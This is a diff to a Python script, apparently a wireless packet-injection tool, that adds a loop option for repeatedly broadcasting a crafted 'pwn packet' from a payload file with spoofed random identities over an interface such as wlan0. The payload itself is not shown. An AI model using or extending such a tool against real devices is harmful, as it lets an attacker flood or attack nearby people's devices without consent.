@@ -81,12 +81,17 @@ def send_payload(
     play_count=10,
     iface="wlan0",
     sleep_time=0,
+    loop_count=0,
 ):
     packet = create_pwn_packet(payload_file_path, use_random_identity)
 
-    sendp(packet, loop=0, count=play_count, iface=iface, verbose=True)
-    if sleep_time > 0:
-        sleep(sleep_time)
+    if loop_count > 0:
+        for i in range(0, loop_count):
+            sendp(packet, loop=0, count=play_count, iface=iface, verbose=True)
+            if sleep_time > 0:
+                sleep(sleep_time)
+    else:
+        sendp(packet, loop=0, count=play_count, iface=iface, verbose=True)
 
 
 def help():
@@ -102,6 +107,7 @@ def main():
     count = 1
     random_identity = True
     sleep_time = 0
+    loop_count = 0
 
     if not len(sys.argv[1:]):
         help()
@@ -109,8 +115,16 @@ def main():
     try:
         opts, _ = getopt.getopt(
             sys.argv[1:],
-            "he:p:i:c:r:s:",
-            ["help", "payload", "interface", "count", "random_identity", "sleep_time"],
+            "h:p:i:c:r:s:l:",
+            [
+                "help",
+                "payload",
+                "interface",
+                "count",
+                "random_identity",
+                "sleep_time",
+                "loop",
+            ],
         )
     except getopt.GetoptError as err:
         print(str(err))
@@ -130,12 +144,15 @@ def main():
                 random_identity = arg != "False"
             elif opt in ("-s", "--sleep_time"):
                 sleep_time = int(arg)
+            elif opt in ("-l", "--loop"):
+                loop_count = int(arg)
         except:
             print("Error parsing arguments")
-            help()
 
     if payload_file_path:
-        send_payload(payload_file_path, random_identity, count, iface, sleep_time)
+        send_payload(
+            payload_file_path, random_identity, count, iface, sleep_time, loop_count
+        )
     else:
         print("Payload path is required")
         help()
